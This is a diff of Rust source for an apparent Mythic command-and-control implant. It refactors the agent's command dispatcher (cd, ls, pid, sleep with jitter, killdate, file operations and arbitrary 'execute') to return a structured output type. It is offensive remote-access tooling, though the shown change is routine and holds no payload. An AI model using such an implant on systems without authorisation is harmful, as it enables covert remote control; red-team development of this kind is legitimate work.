@@ -5,7 +5,7 @@
 ///
 /// Note: "download" and "upload" are handled directly in run_c2_loop
 /// because they require multi-step Mythic file transfer protocol.
-pub fn dispatch_common(command: &str, parameters: &str) -> Option<String> {
+pub fn dispatch_common(command: &str, parameters: &str) -> Option<crate::CommandOutput> {
     let output = match command {
         "cd" => {
             let path = crate::extract_param(parameters, "path");
@@ -21,26 +21,34 @@ pub fn dispatch_common(command: &str, parameters: &str) -> Option<String> {
                     .unwrap_or_else(|_| "[+] done".into()),
                 Err(e) => format!("[-] cd {}: {}", target, e),
             }
+            .into()
         }
         "pwd" => std::env::current_dir()
             .map(|p| p.display().to_string())
-            .unwrap_or_else(|e| format!("[-] {}", e)),
+            .unwrap_or_else(|e| format!("[-] {}", e))
+            .into(),
         "ls" => {
             let path = crate::extract_param(parameters, "path");
-            crate::list_dir(if path.is_empty() { "." } else { &path })
+            return Some(crate::list_dir_browser(if path.is_empty() {
+                "."
+            } else {
+                &path
+            }));
         }
-        "pid" => std::process::id().to_string(),
+        "pid" => std::process::id().to_string().into(),
         "sleep" => {
             let secs = crate::extract_param(parameters, "seconds");
             let jitter = crate::extract_param(parameters, "jitter");
-            crate::handle_sleep_command(format!("{} {}", secs, jitter).trim())
+            crate::handle_sleep_command(format!("{} {}", secs, jitter).trim()).into()
         }
-        "killdate" => crate::handle_killdate_command(&crate::extract_param(parameters, "date")),
-        "cp" => copy_path(parameters),
-        "mv" => move_path(parameters),
-        "rm" => remove_path(parameters),
-        "mkdir" => make_dir(parameters),
-        "execute" => execute_cmd(parameters),
+        "killdate" => {
+            crate::handle_killdate_command(&crate::extract_param(parameters, "date")).into()
+        }
+        "cp" => copy_path(parameters).into(),
+        "mv" => move_path(parameters).into(),
+        "rm" => remove_path(parameters).into(),
+        "mkdir" => make_dir(parameters).into(),
+        "execute" => execute_cmd(parameters).into(),
         _ => return None,
     };
     Some(output)
